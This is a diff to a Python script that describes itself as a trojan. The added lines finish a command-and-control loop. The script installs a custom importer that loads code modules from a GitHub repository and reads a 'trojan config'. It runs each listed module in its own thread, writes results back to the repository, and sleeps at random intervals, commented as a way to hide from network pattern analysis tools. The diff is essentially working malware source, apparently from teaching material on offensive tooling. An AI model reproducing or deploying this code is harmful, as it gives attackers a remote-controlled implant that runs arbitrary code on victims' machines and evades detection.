@@ -8,9 +8,7 @@ import sys
 import base64
 import json
 
-
 import types
-
 
 from github3 import login
 
@@ -36,7 +34,6 @@ def connect_to_github():
 
 # grabs files then read contents locally
 def get_file_contents(filepath):
-
     gh, repo, branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
 
@@ -58,7 +55,6 @@ def get_trojan_config():
 
     for task in config:
         if task["module"] not in sys.modules:
-
             exec("import %s" % task["module"])
     return config
 
@@ -99,3 +95,29 @@ class GitImporter(object):
         return module
 
 
+def module_runner(module):
+    taskQueue.put(1)
+    result = sys.modules[module].run()
+    taskQueue.get()
+
+    # store result in repo
+    store_module_result(result)
+
+    return
+
+# add custom module importer to sys.meta_path
+sys.meta_path = [GitImporter()]
+
+while True:
+
+    if taskQueue.empty():
+
+        config = get_trojan_config()
+
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            # sleep to hide from network pattern analysis tools
+            time.sleep(random.randint(1, 10))
+
+    time.sleep(random.randint(1000, 10000))
